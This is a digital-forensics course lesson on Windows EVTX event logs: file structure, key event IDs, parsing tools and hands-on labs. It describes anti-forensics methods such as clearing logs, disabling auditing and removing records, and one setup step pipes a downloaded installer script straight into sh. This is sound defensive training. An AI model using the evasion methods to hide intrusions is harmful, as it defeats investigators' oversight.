# Day 14: Windows Event Logs: EVTX Structure and Key Event IDs

> **Phase 2: Windows Forensics** · **Level:** 🟡 Intermediate · **Time:** ~4 hours (reading + labs) · **Posted:** 2026-10-11
>
> **Tools today:** 🛠️ EvtxECmd · 🛠️ evtx_dump · 🛠️ FullEventLogView

---

## 🎯 Learning objectives

By the end of today you will be able to:

1. Find a Windows system's event logs, explain **channels**, and know what is (and isn't) logged by default.
2. Describe the **EVTX format**: file header, 64 KB chunks, records, **binary XML templates**, and the checksums that reveal damage or tampering.
3. Recognise the **key event IDs** for logons, privileges, process creation, services, scheduled tasks, PowerShell, boots/shutdowns, USB devices and log clearing, and read **logon types** and **failure codes**.
4. Parse logs with **EvtxECmd** (maps, CSV) and **evtx_dump** (XML/JSON) on Linux, and know where **FullEventLogView** fits on Windows.
5. Build the story of an intrusion from logs alone, and recognise **anti-forensics**: cleared logs, gaps, disabled auditing.

---

## Part 1: The lesson

Event logs are Windows' own diary. Services, drivers and applications write **events**: who logged on and from where, which service was installed, which program started, which USB disk was connected. For many questions they're the only source that records **who** did something, **when**, and from **which remote machine**.

### 1.1 Where logs live, and channels

| | |
|---|---|
| **Files** | `C:\Windows\System32\winevt\Logs\*.evtx` (one file per log). A `/` in a log name becomes `%4` in the file name: `Microsoft-Windows-PowerShell/Operational` → `Microsoft-Windows-PowerShell%4Operational.evtx` |
| **"Windows Logs"** | `Application`, `Security`, `Setup`, `System`, `ForwardedEvents` |
| **"Applications and Services Logs"** | Hundreds of **channels**, usually `Provider/Admin` or `Provider/Operational` (e.g. `Microsoft-Windows-TerminalServices-LocalSessionManager/Operational`) |
| **Configuration** | `HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\WINEVT\Channels\<channel>` (enabled, max size, retention); classic logs also under `HKLM\SYSTEM\CurrentControlSet\Services\EventLog\<log>` |
| **Size and rollover** | Logs are size-limited and overwrite their oldest events by default. Application, Security and System are typically 20 MB; many Operational logs only about 1 MB, so they can cover hours rather than months |
| **Times** | Every event's `TimeCreated` is stored in **UTC**. Event Viewer converts it to the viewer's local time; parsers usually show UTC |

**Collecting logs:** copy the whole `winevt\Logs` folder (KAPE's `EventLogs` target, Day 9), or export a live log with `wevtutil epl Security C:\Case\Security.evtx`. Remember that logs often roll over quickly: collect early, and look for older copies in **Volume Shadow Copies** (Day 20) and in the organisation's **SIEM** or log forwarding.

**What's logged depends on configuration.** Many of the most useful events are **off by default**:

| Event | Needs |
|---|---|
| Security 4688 (process created) | Audit policy *Detailed Tracking > Audit Process Creation*; the command line also needs *Include command line in process creation events* |
| Security 4698 (scheduled task created) | *Object Access > Audit Other Object Access Events* |
| PowerShell 4104 (script block) | *Turn on PowerShell Script Block Logging* (Windows PowerShell 5 also logs script blocks it considers suspicious, at **Warning** level, without it) |
| Process, network and file events with hashes | **Sysmon** (Day 16) |

Check what a system audits with `auditpol /get /category:*` (live) or from the registry and `secpol` settings in a collection. "No 4688 events" usually means *not audited*, not *nothing ran*.

### 1.2 The EVTX format

```
+-------------------------------+ 0
| File header (4,096 bytes)     |  "ElfFile\0", version 3.1/3.2, first/last chunk, next record ID,
|                               |  flags (DIRTY, FULL), CRC32 of the first 120 bytes
+-------------------------------+ 4096
| Chunk 0 (65,536 bytes)        |  "ElfChnk\0", first/last record ID, free-space offset,
|  512-byte chunk header        |  CRC32 of the header and of the records, a 64-entry STRING TABLE
|  records ...                  |  (element and attribute names) and a 32-entry TEMPLATE TABLE
+-------------------------------+
| Chunk 1 ...                   |
+-------------------------------+
Record:  "**\0\0" | size | record ID | time written (FILETIME) | binary XML | size again
```

**Binary XML and templates.** A record doesn't store the XML text you see. It stores **binary XML** tokens. The first record in a chunk that uses a given layout defines a **template** (the XML skeleton: `<Event><System><Provider Name=…>…<EventData>…`) with numbered **substitutions**; that record and every later one in the chunk only add a **template instance**: a reference to the template plus an array of typed **values** (strings, integers, FILETIMEs, SIDs, GUIDs, binary). Windows nests this: a **System** template shared by many events (18 values in Lab 1's Windows 7 sample, 20 on Windows 10/11: level, task, event ID, keywords, time, record ID, process and thread IDs, user SID…), whose last value is **another** binary XML fragment with the event's own **EventData** template. You'll see exactly that in Labs 1 and 3.

What this means for an examiner:

- **Messages aren't in the file.** The sentence you read in Event Viewer ("An account was successfully logged on…") comes from the provider's message DLL **on the viewing machine**. EVTX holds only the values. Values like `%%1833` or `%%1842` are references to further message strings (Event Viewer would show "Impersonation" and "Yes"). Parsers on Linux show the raw data, which is what you want for analysis anyway.
- **Each event has two numbers.** The record header has a **record ID**, and the System data has an **EventRecordID**. They normally match and increase by one per event; a **gap** means events were removed or the file was produced from a larger log (Lab 1).
- **Checksums.** Each chunk carries CRC32s of its header and its records, and the file header has its own. A **DIRTY** flag only means the log was in use when copied (normal for a live collection). Real damage or editing shows up as CRC mismatches or broken records.
- **Deleted and old records.** Records are not cleared when a chunk is reused until they're overwritten, and whole chunks can be **carved** from unallocated space or memory by their `ElfChnk` signature (Day 8's carving ideas apply).

### 1.3 The key event IDs

**Security log** (provider `Microsoft-Windows-Security-Auditing`):

| ID | Meaning | Look at |
|---|---|---|
| **4624** | Successful logon | `LogonType`, `TargetUserName`, `TargetLogonId`, `WorkstationName`, `IpAddress`, `AuthenticationPackageName` (NTLM/Kerberos) |
| **4625** | Failed logon | `Status` / `SubStatus` (below), source IP: brute force and password spraying |
| **4634** / **4647** | Logoff / user-initiated logoff | Same `TargetLogonId` as the 4624: gives the **session length** |
| **4648** | Logon with explicit credentials (`runas`, some lateral movement) | Target server and account |
| **4672** | Special privileges assigned to a new logon | An **administrator-equivalent** logon (same Logon ID as its 4624) |
| **4688** | New process created (if audited) | `NewProcessName`, `CommandLine`, parent `ParentProcessName`/`ProcessId`, creator account |
| **4697** | Service installed (if audited) | Account that installed it |
| **4698** / 4699 / 4702 | Scheduled task created / deleted / updated (if audited) | `TaskName`, the full task XML in `TaskContent` |
| **4720**, **4728/4732/4756** | Account created; added to a global/local/universal group | Backdoor accounts, privilege escalation |
| **4776** | NTLM credential validation (local SAM or a DC) | Account, workstation, error code |
| **4768** / **4769** | Kerberos TGT / service ticket (domain controllers) | Kerberoasting, unusual encryption types |
| **1102** | The **Security** log was cleared | Account that cleared it |
| **4719** | Audit policy changed | Auditing turned off |

**Logon types** (4624/4625/4634): **2** interactive (console), **3** network (SMB shares, PsExec, WMI…), **4** batch (scheduled tasks), **5** service, **7** unlock, **8** network cleartext, **9** new credentials (`runas /netonly`), **10** remote interactive (RDP), **11** cached interactive.

**Common 4625 codes** (`Status` / `SubStatus`): `0xC000006D` + `0xC0000064` user name doesn't exist; `0xC000006D` + `0xC000006A` **wrong password** for an existing user; `0xC000006E` + `0xC0000072` account **disabled**; `0xC0000234` account locked out; `0xC000006F` logon outside allowed hours. Many failures for *different* names from one IP is **password spraying**; many for *one* name is **brute force**.

**System log:**

| ID | Provider | Meaning |
|---|---|---|
| **7045** | Service Control Manager | **A service was installed** (name, image path, start type, account; the System `UserID` is the installer) |
| **7036** | Service Control Manager | A service entered the running/stopped state |
| 7040 | Service Control Manager | A service's start type changed |
| **104** | Microsoft-Windows-Eventlog | **A log was cleared** (any log except Security; the channel is in the event) |
| **12** / **13** | Microsoft-Windows-Kernel-General | Operating system started / shut down (exact times in the data) |
| **6005** / **6006** / 6008 | EventLog | Event log service started / stopped (boot / clean shutdown) / previous shutdown was unexpected |
| **1074** | User32 | A process or user initiated a shutdown or restart (who, how, reason) |

**Other channels you'll use constantly:**

| Channel | IDs | Why |
|---|---|---|
| `Microsoft-Windows-PowerShell/Operational` | **4104** script block, 4103 module logging | The code that ran, even when obfuscated or typed interactively |
| `Microsoft-Windows-TaskScheduler/Operational` | **106** task registered, 140 updated, 141 deleted, 200/201 action started/completed | Persistence |
| `Microsoft-Windows-TerminalServices-RemoteConnectionManager/Operational` | 1149 RDP authentication | RDP source IP and user |
| `Microsoft-Windows-TerminalServices-LocalSessionManager/Operational` | 21, 24, 25 | RDP session logon, disconnect, reconnect |
| `Microsoft-Windows-Windows Defender/Operational` | 1116, 1117 | Malware detected / action taken |
| `Microsoft-Windows-WMI-Activity/Operational` | 5861 | WMI event subscriptions (persistence) |
| `Microsoft-Windows-Partition/Diagnostic` | **1006** | A disk (often **USB**) connected or removed: vendor, model, serial, capacity, and copies of its MBR and **volume boot records** |
| `Microsoft-Windows-Kernel-PnP/Configuration` | **400**, 410 | A device was configured (400 for a new device instance) / started |

### 1.4 Reading logs like an investigator

- **Follow the Logon ID.** A 4624's `TargetLogonId` reappears as `SubjectLogonId` in that session's 4672, 4688, 4698… and in its 4634/4647. That's how you attribute actions to a session and measure how long it lasted.
- **Rebuild process trees.** 4688's `NewProcessId` and `ProcessId` (the parent) are hexadecimal, and process IDs are reused. Match them within a short time window, together with the parent's image name.
- **Line up independent sources.** A PsExec session typically shows **4624 type 3** (+4672) → **7045** service `PSEXESVC` → **4688** `PSEXESVC.exe` → processes under the remote user → **7036** stopped → **4634**. Compare Day 11's deleted `PSEXESVC` key and Day 12's Prefetch.
- **Know your baselines.** Boot/shutdown events (12, 13, 6005, 6006, 1074) tell you when the machine was on. Activity outside those windows, or a 6008 "unexpected shutdown", deserves attention.

### 1.5 Anti-forensics and how it shows

| Technique | Trace |
|---|---|
| Clearing the Security log | **1102** (by whom) as the first event of the new log |
| Clearing any other log | **104** in the System log, naming the cleared channel. PowerShell's `Clear-EventLog` only handles **classic** logs (Application, System, Windows PowerShell…), so the Operational channels often survive |
| Turning auditing off | **4719** audit policy change; then silence |
| Stopping the event log service | 1100 "event logging service has shut down"; gaps in time; 6005 at the next start |
| Removing selected records with tools | **EventRecordID gaps**, broken chunk checksums, timestamps out of order |
| Deleting the `.evtx` files | Files missing from `winevt\Logs`; recover from shadow copies, carve `ElfChnk` chunks, check the SIEM |

---

## Part 2: Tools

---

### 🛠️ Tool 1: EvtxECmd

| | |
|---|---|
| **What** | Eric Zimmerman's EVTX parser with community **maps** that normalise hundreds of event types into common columns (user, remote host, payload fields, executable) |
| **Why in DFIR** | One CSV/JSON/XML timeline from a whole folder of logs (or a KAPE collection), with filtering by event ID and date, per-log metrics, shadow copy support and "time discrepancy" detection |
| **Platforms** | Windows (.NET 9 and .NET 4.7.2 builds). **Built from source and run on Ubuntu 24.04** in this lesson (`--vss` needs Windows) |
| **Licence** | MIT |
| **Home** | https://github.com/EricZimmerman/evtx (code **and** maps) · downloads: https://ericzimmerman.github.io |

#### Requirements

Windows 10/11 with the .NET 9 runtime (Day 1), or Linux with a .NET SDK (Ubuntu 24.04: `dotnet-sdk-10.0`). The **Maps** folder must sit next to the executable (or be given with `--maps`).

#### Installation

```powershell
# Windows: with all EZ tools (Day 1). -Sync also updates EvtxECmd's maps
C:\Tools\ZimmermanTools\Get-ZimmermanTools.ps1 -Dest C:\Tools\ZimmermanTools -NetVersion 9 -Sync
C:\Tools\ZimmermanTools\net9\EvtxECmd\EvtxECmd.exe --version
```

```bash
# Linux (validated here): build from source and copy the maps from the same repository
sudo apt install -y dotnet-sdk-10.0 git
git clone -q --depth 1 https://github.com/EricZimmerman/evtx.git ~/tools/evtx-src
dotnet publish ~/tools/evtx-src/EvtxECmd/EvtxECmd.csproj -c Release -f net9.0 -o ~/tools/EvtxECmd -v quiet > /dev/null
cp -r ~/tools/evtx-src/evtx/Maps ~/tools/EvtxECmd/Maps
echo 'evtxecmd() { DOTNET_ROLL_FORWARD=Major ~/tools/EvtxECmd/EvtxECmd "$@"; }' >> ~/.bashrc
```

To update the maps later: `EvtxECmd.exe --sync` on Windows, or `git -C ~/tools/evtx-src pull` and copy the folder again on Linux.

#### Configuration

From `EvtxECmd --help`:

| Option | Meaning |
|---|---|
| `-f FILE` / `-d DIR` | One log / every `.evtx` under a folder, recursively |
| `--csv DIR --csvf NAME` | CSV output (also `--json`/`--jsonf` with `--fj` for all data, `--xml`/`--xmlf`) |
| `--inc 4624,4625,7045` / `--exc …` | Only / never these event IDs (ranges like `5500-5600` allowed) |
| `--sd` / `--ed` | Start / end date (UTC), in the `--dt` format |
| `--maps DIR`, `--sync` | Where the maps are; download the latest maps from GitHub |
| `--tdt N` | Seconds of tolerance for time-discrepancy detection (default 1) |
| `--met` | Per-log metrics (event ID counts); on by default |
| `--vss`, `--dedupe` | Include Volume Shadow Copies (Windows); skip duplicate logs by SHA-1 |

**Maps** are YAML files named `<Channel>_<Provider>_<EventID>.map` (e.g. `Security_Microsoft-Windows-Security-Auditing_4624.map`). Each picks values with XPath (`/Event/EventData/Data[@Name="IpAddress"]`) into the CSV columns `UserName`, `RemoteHost`, `ExecutableInfo` and `PayloadData1`–`6`, and sets `MapDescription`. The full event is always in the `Payload` column as JSON. The maps folder's `!!!!README.md` explains how to write your own.

#### Verify the installation

```bash
evtxecmd --version                    # 2026.5.0+<commit> was used here
ls ~/tools/EvtxECmd/Maps/*.map | wc -l  # several hundred maps
```

#### First use

```powershell
# A KAPE collection (Day 9): every log, one CSV, then open it in Timeline Explorer
EvtxECmd.exe -d E:\Cases\WS-ALICE\tout\C\Windows\System32\winevt\Logs --csv E:\Cases\WS-ALICE\evtx --csvf ws-alice.csv
# Only logons and service installs from the incident window
EvtxECmd.exe -d E:\Cases\WS-ALICE\tout\C\Windows\System32\winevt\Logs --csv E:\Cases\WS-ALICE\evtx --inc 4624,4625,4672,7045 --sd "2026-09-29 00:00:00.0000000"
```

#### Troubleshooting

| Symptom | Fix |
|---|---|
| `Maps directory … does not exist! Event ID maps will not be loaded` | Copy the `Maps` folder next to the executable, or pass `--maps` |
| `MapDescription` doesn't fit the event | Maps are community-written. Kernel-PnP 400's map says "Device driver error" for a normal device install, and User32 1074's says "restart" even for a power-off. Read the payload |
| `&amp;` or `&lt;` inside `PayloadData` fields | The values are taken from the XML and keep XML escaping. Read `Payload` (JSON) or use evtx_dump |
| An event type has empty `PayloadData` columns | No map for it yet: the data is still in `Payload`. Write a map |
| `--vss` disabled | Shadow copies are Windows-only; mount them yourself on Linux (Day 20) |

---

### 🛠️ Tool 2: evtx_dump (omerbenamram/evtx)

| | |
|---|---|
| **What** | A fast, cross-platform EVTX parser written in Rust (the `evtx` crate), with the command-line tool `evtx_dump` |
| **Why in DFIR** | Converts logs to **XML, JSON or JSON Lines** for `jq`, Python or a SIEM; multi-threaded; can validate chunk checksums and recover some damaged records; also builds template caches from Windows binaries to render records whose templates are missing |
| **Platforms** | Linux, macOS, Windows (prebuilt 64-bit binaries, or build with Cargo). **Built and run on Ubuntu 24.04** in this lesson |
| **Licence** | MIT / Apache-2.0 |
| **Home** | https://github.com/omerbenamram/evtx · releases: https://github.com/omerbenamram/evtx/releases |

#### Requirements

A recent Rust toolchain to build it (version 0.12.3 uses Rust edition 2024, newer than Ubuntu 24.04's packaged `rustc` 1.75), or a prebuilt binary.

#### Installation

```bash
# Linux/macOS: build with Cargo (install Rust with rustup if you don't have it)
command -v cargo > /dev/null || curl --proto '=https' --tlsv1.2 -sSf https://sh.rustup.rs | sh -s -- -y --profile minimal
. ~/.cargo/env
cargo install evtx --root ~/tools/evtx          # builds evtx_dump into ~/tools/evtx/bin
~/tools/evtx/bin/evtx_dump --version
```

```powershell
# Windows: download the Windows executable from the latest release at
#   https://github.com/omerbenamram/evtx/releases
# save it as evtx_dump.exe, and check it runs:
.\evtx_dump.exe --version
```

(The container used for this lesson already had Rust 1.94, so the rustup line was skipped.)

#### Configuration

From `evtx_dump --help`:

| Option | Meaning |
|---|---|
| `-o xml` / `json` / `jsonl` | Output format (default XML; `jsonl` = one compact JSON object per line, no record headers) |
| `-f FILE`, `--no-confirm-overwrite` | Write to a file instead of stdout |
| `--events 1-10,20` | Only these records (1-based position in the file) |
| `--validate-checksums` | Skip chunks whose CRC32 doesn't match (dirty logs will lose records: use for checking, not for extraction) |
| `--separate-json-attributes` | Put XML attributes in `<name>_attributes` objects instead of `#attributes` |
| `-t N` | Worker threads (default: all cores) |
| `--ansi-codec` | Code page for non-Unicode strings (default windows-1252) |
| `extract-wevt-templates`, `apply-wevt-cache` | Build and use a template cache from Windows EXE/DLL resources when a log's own templates are damaged |

In JSON, attributes are under `#attributes` and element text under `#text` when an element has both: `e["System"]["TimeCreated"]["#attributes"]["SystemTime"]`.

#### Verify the installation

```bash
evtx_dump --version          # "EVTX Parser 0.12.3" was used here
```

#### First use

```bash
evtx_dump -o jsonl Security.evtx > security.jsonl
jq -c 'select(.Event.System.EventID == 4625) | .Event.EventData | {TargetUserName, IpAddress, Status, SubStatus}' security.jsonl
```

#### Troubleshooting

| Symptom | Fix |
|---|---|
| `cargo install` fails with an edition or version error | Your Rust is too old (Ubuntu's packaged one is). Install the current toolchain with rustup |
| Fewer records with `--validate-checksums` | Dirty or damaged chunks are skipped. Parse without it, and note the damage |
| Prompted before overwriting | Add `--no-confirm-overwrite` with `-f` |
| `EventID` sometimes an object, sometimes a number in JSON | Classic events have a `Qualifiers` attribute, so the value moves to `#text`. Handle both |
| Strange characters in old (non-Unicode) strings | Set `--ansi-codec` to the system's code page |

---

### 🛠️ Tool 3: FullEventLogView

| | |
|---|---|
| **What** | NirSoft's event log viewer: one table of **all** events from all logs, with the **full message text** |
| **Why in DFIR** | Fast triage on a Windows analysis machine: sort and filter every channel at once, load logs from a live system, a **remote** computer or a folder of **collected `.evtx` files**, and export the result to text, CSV, tab-delimited, HTML or XML (from the GUI and from the command line) |
| **Platforms** | **Windows only** (Windows Vista to 11; 32- and 64-bit builds) |
| **Licence** | Freeware (closed source) |
| **Home** | https://www.nirsoft.net/utils/full_event_log_view.html |

> ⚠️ **Not run here.** FullEventLogView is a Windows GUI program, and nirsoft.net isn't reachable from this lab environment. The version, download URLs and hashes below come from its **winget** and **Scoop** package manifests (version 1.81, released 2026-02-16). Read its command-line options in the help on the tool's web page or in the `readme` inside the download before scripting it.

#### Requirements

Any supported Windows version; administrator rights to read the live Security log. To get full messages for logs collected from another machine, the providers' message DLLs must exist on your analysis machine (a matching Windows version works best).

#### Installation (Windows)

```powershell
# Option 1: winget (package NirSoft.FullEventLogView)
winget install --id NirSoft.FullEventLogView -e

# Option 2: Scoop (NirSoft bucket)
scoop bucket add nirsoft
scoop install fulleventlogview

# Option 3: manual, with an integrity check (hash for version 1.81 x64, from the package manifests)
Invoke-WebRequest https://www.nirsoft.net/utils/fulleventlogview-x64.zip -OutFile fulleventlogview-x64.zip
(Get-FileHash .\fulleventlogview-x64.zip -Algorithm SHA256).Hash   # DD67610F19A4FFFE77460F55EBB318523CC8BCBCB8FC3D462EE0DFFAB4BA1D95
Expand-Archive .\fulleventlogview-x64.zip C:\Tools\FullEventLogView
```

A newer version has a different hash: compare with the current manifest or the vendor's page.

#### Configuration

- **Options > Advanced Options** chooses the **data source** (local computer, remote computer, or a folder / specific `.evtx` files from a collection) and the time range and level filters to load.
- Settings are kept in `FullEventLogView.cfg` next to the executable (keep a copy per case if you change them).
- Narrow the list with the Advanced Options filters and **Edit > Find**, then save the selected events (to text, CSV, HTML or XML) for your notes.

#### Verify the installation

Run `FullEventLogView.exe` on your analysis machine: the table fills with the local events, and **Help > About** shows the version.

#### First use

Point **Advanced Options** at the collected `winevt\Logs` folder, load the incident window (for WS-ALICE: 2026-09-29 00:50–01:45 UTC), sort by *Event Time*, and read the full descriptions alongside the event IDs you learned in Part 1.

#### Troubleshooting

| Symptom | Fix |
|---|---|
| Descriptions empty or "cannot be found" | The provider's message DLL isn't on your analysis machine (logs from another Windows version or from third-party software). The data fields are still there |
| Live Security log empty | Run as administrator |
| Times differ from your Linux tools by your UTC offset | Check whether the GUI is showing local time or UTC (see its Options menu), and note the setting in your case notes |
| Need repeatable output for a report | Prefer EvtxECmd or evtx_dump for scripted processing, and use FullEventLogView to browse |

---

## Part 3: Hands-on labs

First you'll take apart a **real** Security log (from the evtx project's public samples). Then you'll investigate **WS-ALICE**'s logs for the night of 2026-09-29, generated by `scripts/mk_event_logs.py` in the real EVTX format (chunks, string and template tables, nested templates, CRC32s). They were checked with four independent parsers: evtx_dump, EvtxECmd, libevtx (`evtxexport`) and python-evtx. The events carry on from Days 9–13: the same times, accounts, services, share and USB drive.

Run on Ubuntu 24.04 or SIFT.

```bash
sudo apt update && sudo apt install -y libevtx-utils git curl dotnet-sdk-10.0
git -C ~/DFIR pull 2>/dev/null || git clone https://github.com/Mr-Phoenix07/DFIR.git ~/DFIR
mkdir -p ~/cases/LAB-014/{evidence,work,notes,samples} ~/tools && cd ~/cases/LAB-014
export TZ=UTC
```

Install evtx_dump and build EvtxECmd (5–10 minutes the first time):

```bash
command -v cargo > /dev/null || curl --proto '=https' --tlsv1.2 -sSf https://sh.rustup.rs | sh -s -- -y --profile minimal
[ -f ~/.cargo/env ] && . ~/.cargo/env
[ -x ~/tools/evtx/bin/evtx_dump ] || cargo install -q evtx --root ~/tools/evtx
[ -d ~/tools/evtx-src ] || git clone -q --depth 1 https://github.com/EricZimmerman/evtx.git ~/tools/evtx-src
git -C ~/tools/evtx-src log -1 --format='EvtxECmd source %h %cs'
DOTNET_CLI_TELEMETRY_OPTOUT=1 DOTNET_NOLOGO=1 dotnet publish ~/tools/evtx-src/EvtxECmd/EvtxECmd.csproj -c Release -f net9.0 -o ~/tools/EvtxECmd -v quiet > /dev/null
rm -rf ~/tools/EvtxECmd/Maps && cp -r ~/tools/evtx-src/evtx/Maps ~/tools/EvtxECmd/Maps
evtx_dump() { ~/tools/evtx/bin/evtx_dump "$@"; }
evtxecmd() { DOTNET_ROLL_FORWARD=Major ~/tools/EvtxECmd/EvtxECmd "$@"; }
evtx_dump --version
evtxecmd --version
ls ~/tools/EvtxECmd/Maps/*.map | wc -l
evtxinfo -V | head -n 1
```

```
EvtxECmd source 03a7a1f 2026-06-17
EVTX Parser 0.12.3
2026.5.0+03a7a1fba32760f20841bea3c12099169f9ecf2d
468
evtxinfo 20181227
```

### Lab 1: Inside a real EVTX file (20 min)

```bash
cd ~/cases/LAB-014/samples
curl -sSfL -o new-user-security.evtx https://raw.githubusercontent.com/omerbenamram/evtx/master/samples/new-user-security.evtx
sha256sum new-user-security.evtx | tee ../notes/samples.sha256
xxd -l 48 new-user-security.evtx
xxd -s 4096 -l 16 new-user-security.evtx
python3 ~/DFIR/scripts/evtx_peek.py new-user-security.evtx --records 4 --templates
evtx_dump new-user-security.evtx | sed -n '/^Record 2$/,/<\/Event>/p' | sed -n '/<EventID>/p;/<EventRecordID>/p;/<Computer>/p;/<EventData>/,/<\/EventData>/p'
```

```
6f9fe51d0a5dec63dc68f819e23bc14da5db0b75db4a68dfdf6b39f02868a379  new-user-security.evtx
00000000: 456c 6646 696c 6500 0000 0000 0000 0000  ElfFile.........
00000010: 0000 0000 0000 0000 0500 0000 0000 0000  ................
00000020: 8000 0000 0100 0300 0010 0100 0000 0000  ................
00001000: 456c 6643 686e 6b00 0100 0000 0000 0000  ElfChnk.........
File            : new-user-security.evtx (69632 bytes)
Format version  : 3.1    header size 128, header block 4096 bytes
Chunks          : 1 in header (first 0, last 0); 1 chunk slots in the file
Next record ID  : 5
Flags           : 0x0 (clean)
Header CRC32    : stored 0xa07db39d, calculated 0xa07db39d -> OK

Chunk 0 at file offset 0x1000
  Records       : IDs 1-4 (numbers 1-4), 4 records
  Last record at: 0x1598; free space from 0x1778 (59528 bytes free)
  Header CRC32  : stored 0x7d221818, calculated 0x7d221818 -> OK
  Records CRC32 : stored 0x8facf384, calculated 0x8facf384 -> OK
  String table  : 21 of 64 buckets used; template table: 3 of 32 used
  Template at 0x07ab: GUID c04c2b38-980d-4224-8ee2-29bd1080f24b, 626 bytes: EventData Data @Name Data @Name Data @Name Data @Name Data @Name Data ...
  Template at 0x0c0d: GUID 1c1fdc76-5aa0-ee4e-6000-0ef86c37d0b6, 1494 bytes: EventData Data @Name Data @Name Data @Name Data @Name Data @Name Data ...
  Template at 0x0226: GUID 49dea60c-22d9-8094-e95d-0670e7b358ab, 1158 bytes: Event @xmlns System Provider @Name @Guid EventID @Qualifiers Version Level Task Opcode ...
  Record 1 at 0x0200: 2304 bytes, written 2013-10-23 16:22:39.9735000
      template at 0x0226 (defined here), 18 values: UInt8 UInt8 UInt16 UInt16 Null HexInt64 FILETIME Null UInt32 UInt32 UInt64 UInt8 Null Null String GUID String BinXml
  Record 2 at 0x0b00: 2248 bytes, written 2013-10-23 16:22:39.9891250
      template at 0x0226 (reused), 18 values: UInt8 UInt8 UInt16 UInt16 Null HexInt64 FILETIME Null UInt32 UInt32 UInt64 UInt8 Null Null String GUID String BinXml
  Record 3 at 0x13c8: 464 bytes, written 2013-10-23 16:22:39.9891250
      template at 0x0226 (reused), 18 values: UInt8 UInt8 UInt16 UInt16 Null HexInt64 FILETIME Null UInt32 UInt32 UInt64 UInt8 Null Null String GUID String BinXml
  Record 4 at 0x1598: 480 bytes, written 2013-10-23 16:22:40.0360000
      template at 0x0226 (reused), 18 values: UInt8 UInt8 UInt16 UInt16 Null HexInt64 FILETIME Null UInt32 UInt32 UInt64 UInt8 Null Null String GUID String BinXml
    <EventID>4720</EventID>
    <EventRecordID>112</EventRecordID>
    <Computer>IE8Win7</Computer>
  <EventData>
    <Data Name="TargetUserName">IEUser</Data>
    <Data Name="TargetDomainName">IE8Win7</Data>
    <Data Name="TargetSid">S-1-5-21-3463664321-2923530833-3546627382-1000</Data>
    <Data Name="SubjectUserSid">S-1-5-18</Data>
    <Data Name="SubjectUserName">WIN-QALA5Q3KJ43$</Data>
    <Data Name="SubjectDomainName">WORKGROUP</Data>
    <Data Name="SubjectLogonId">0x3e7</Data>
    <Data Name="PrivilegeList">-</Data>
    <Data Name="SamAccountName">IEUser</Data>
    <Data Name="DisplayName">%%1793</Data>
    <Data Name="UserPrincipalName">-</Data>
    <Data Name="HomeDirectory">%%1793</Data>
    <Data Name="HomePath">%%1793</Data>
    <Data Name="ScriptPath">%%1793</Data>
    <Data Name="ProfilePath">%%1793</Data>
    <Data Name="UserWorkstations">%%1793</Data>
    <Data Name="PasswordLastSet">%%1794</Data>
    <Data Name="AccountExpires">%%1794</Data>
    <Data Name="PrimaryGroupId">513</Data>
    <Data Name="AllowedToDelegateTo">-</Data>
    <Data Name="OldUacValue">0x0</Data>
    <Data Name="NewUacValue">0x15</Data>
    <Data Name="UserAccountControl">
		%%2080
		%%2082
		%%2084</Data>
    <Data Name="UserParameters">%%1793</Data>
    <Data Name="SidHistory">-</Data>
    <Data Name="LogonHours">%%1797</Data>
  </EventData>
```

Read it from the bytes up:

- **File header:** `ElfFile`, next record ID 5 (`05` at 0x18), header size 128 (`80` at 0x20), version **3.1** (`01 00 03 00`), header block 4,096 bytes (`00 10`), **1 chunk**. The first chunk starts at 4,096 (`ElfChnk`). This file is exactly 4 KB + 64 KB; logs taken from a live system are usually bigger than the chunks they use, because Windows allocates file space ahead of time.
- **All checksums match**, so this file is intact.
- **Templates:** record 1 *defines* the System template at chunk offset 0x226; records 2–4 just reuse it with 18 new values. The last value (`BinXml`) is the nested EventData, with templates at 0x7ab and 0xc0d. That's why records that define templates are much bigger (2,304 and 2,248 bytes) than those that only reuse them (464 and 480).
- **Two numbering schemes disagree:** the record headers say 1–4, but the events' `EventRecordID`s are 111–116 (record 2 is 112). This file was most likely saved or exported from a larger Security log, which renumbers the records but keeps each event's own ID. On an original log they match, and a mismatch or gap is worth explaining.
- **The event:** at 2013-10-23 16:22:39 UTC, `SYSTEM` (the machine account `WIN-QALA5Q3KJ43$`, Logon ID `0x3e7`) **created the account `IEUser`** (event 4720). The `%%1793` values are message references (meaning "<value not set>"); EVTX stores the reference, not the text.

### Lab 2: Maps make events readable: EvtxECmd (10 min)

```bash
evtxecmd -f new-user-security.evtx --csv ../work/sample --csvf sample.csv | grep -E 'Maps loaded|Records included|^[0-9]+\s'
python3 - ../work/sample/sample.csv <<'EOF'
import csv, sys
for r in csv.DictReader(open(sys.argv[1], encoding="utf-8-sig")):
    print(f'{r["EventRecordId"]}  {r["TimeCreated"][:19]}  {r["EventId"]}  {r["MapDescription"]}')
    print(f'      {r["UserName"]} | {r["PayloadData1"]} | {r["PayloadData2"]}')
EOF
```

```
Maps loaded: 468
Records included: 4 Errors: 0 Events dropped: 0
4720		1
4728		1
4732		2
111  2013-10-23 16:22:39  4728  A member was added to a security-enabled global group
      WORKGROUP\WIN-QALA5Q3KJ43$ (S-1-5-18) | Target: IE8Win7\None (S-1-5-21-3463664321-2923530833-3546627382-513) | Member: -
112  2013-10-23 16:22:39  4720  A new account was created
      WORKGROUP\WIN-QALA5Q3KJ43$ (S-1-5-18) | Target: IE8Win7\IEUser (S-1-5-21-3463664321-2923530833-3546627382-1000) | 
113  2013-10-23 16:22:39  4732  A member was added to a security-enabled local group
      WORKGROUP\WIN-QALA5Q3KJ43$ (S-1-5-18) | Target: Builtin\Users (S-1-5-32-545) | SubjectLogonId: 0x3E7
116  2013-10-23 16:22:40  4732  A member was added to a security-enabled local group
      WORKGROUP\WIN-QALA5Q3KJ43$ (S-1-5-18) | Target: Builtin\Administrators (S-1-5-32-544) | SubjectLogonId: 0x3E7
```

In four events: a new account `IEUser` was created and put into `None`, `Users` and **`Administrators`**. This is the pattern of a **backdoor administrator account** (in this sample it's a test VM's setup, which is why `SYSTEM` did it). Note the `EventRecordId` sequence **111, 112, 113, 116**: two events in between aren't in this file.

### Lab 3: WS-ALICE's logs (10 min)

```bash
cd ~/cases/LAB-014
python3 ~/DFIR/scripts/mk_event_logs.py evidence/WS-ALICE
L=evidence/WS-ALICE/Windows/System32/winevt/Logs
(cd $L && sha256sum *.evtx) | cut -c1-16,65- | tee notes/evidence.sha256
python3 ~/DFIR/scripts/evtx_peek.py $L/Security.evtx --records 3
